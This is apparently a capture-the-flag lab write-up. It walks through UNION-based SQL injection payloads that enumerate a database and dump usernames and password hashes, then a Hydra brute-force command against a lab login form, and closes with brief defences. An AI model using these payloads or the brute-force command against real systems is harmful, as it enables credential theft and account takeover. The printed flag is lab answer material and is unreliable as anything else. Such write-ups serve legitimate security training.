## Flag

```
b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2
```

## How to find the flag

Knowing that this database is vulnerable to sql injections. We can go to any page which is vulnerable to sql injections like **Members.** Here we will exploit as much as we can the sql injection.

1. **Retrieving information:**
    
    First we should list all the databases inside this webserver. We can do it using the following command:
    
    ```sql
    1 union select schema_name, 2 from information_schema.schemata
    ```
    
    Here we can see that there is a database named Member_Brute_Force.
    
2. **Retrieving database tables:**
    
    In order to get the tables of this database we should get Member_Brute_Force string in hexadecimal:
    
    ```sql
    1 union select table_name, 2 from information_schema.tables where table_schema=0x4d656d6265725f42727574655f466f726365
    ```
    
3. **Finding Columns in the “db_default” table:**
    
    The important table here is db_default, we should list the columns inside of this table:
    
    ```sql
    1 UNION SELECT column_name, 2 FROM information_schema.columns WHERE table_name=0x64625f64656661756c74
    ```
    
    This will give use two important fields, username and password.
    
4. **Extracting data:**
    
     Here we will choose both columns and desplay them:
    
    ```sql
    1 UNION SELECT username, password FROM Member_Brute_Force.db_default
    ```
    
    As we can see we get the users **root** and **admin**. If we decrypt the password using MD5 decrypter we get that the password is **shadow**. Now if we go to the main page in sign in we can use these credentials to get the flag.
    

## Another approach

Knowing that this method is based more in sql injection than brute force i will provide another way to get the password too.

We will be using a tool named **Hydra** in order to automate the process of trying passwords from a dictionary. 

```bash
hydra -l admin -P 1000000-password-seclists.txt -f 192.168.247.128 -s 80 -o hydra.log http-get-form '/index.php:page=signin&username=^USER^&password=^PASS^&Login=Login:F=images/WrongAnswer.gif
```

Here's what each part does:

1. **`hydra`**:
    - This is the main command to start Hydra, a tool used for brute-forcing login credentials on various protocols.
2. **`l admin`**:
    - The `l` flag specifies a single username to use in the attack. Here, it's set to `admin`. Hydra will try to authenticate with this username for each password in the list.
3. **`P 1000000-password-seclists.txt`**:
    - The `P` flag specifies a file with a list of passwords to try. Here, `1000000-password-seclists.txt` is the file that contains the password list Hydra will iterate through. Each line in this file is treated as a potential password.
4. **`f`**:
    - This flag tells Hydra to stop the attack as soon as it finds the correct credentials. Without `f`, Hydra would continue testing all passwords in the list, even after finding a match.
5. **`192.168.247.128`**:
    - This is the target IP address where the attack is directed.
6. **`s 80`**:
    - The `s` flag specifies the port number. Here, it's set to `80`, which is the default HTTP port.
7. **`o hydra.log`**:
    - The `o` flag specifies an output file to save results. Here, results will be written to `hydra.log`.
8. **`http-get-form`**:
    - This specifies the type of login form Hydra will target. In this case, `http-get-form` is used for forms that send data via an HTTP GET request. Other options could include `http-post-form` for POST-based login forms.
9. **`'/index.php:page=signin&username=^USER^&password=^PASS^&Login=Login:F=images/WrongAnswer.gif'`**:
    - This is the main parameter that defines how Hydra should interact with the form. It’s broken down as follows:
        - **`/index.php`**: The path to the login form on the server.
        - **`page=signin&username=^USER^&password=^PASS^&Login=Login`**: These are the form parameters Hydra will use to try logging in. `^USER^` and `^PASS^` are placeholders that Hydra will replace with each username and password combination.
        - **`F=images/WrongAnswer.gif`**: This specifies a condition for a failed login attempt. If the server responds with a page containing `images/WrongAnswer.gif`, Hydra knows the login attempt was unsuccessful.

## Prevent brute-force attack:

We can prevent these attacks using the followed methods:

1. **Rate limiting:**
    
    Limit the number of login attempts from a single IP address in a specific time frame.
    
2. **Account lockout:**
    
    Lock the account temporarily after a certain number of failed login attempts.
    
3. **Captcha**:
    
    Implement a CAPTCHA after a few failed login attempts.
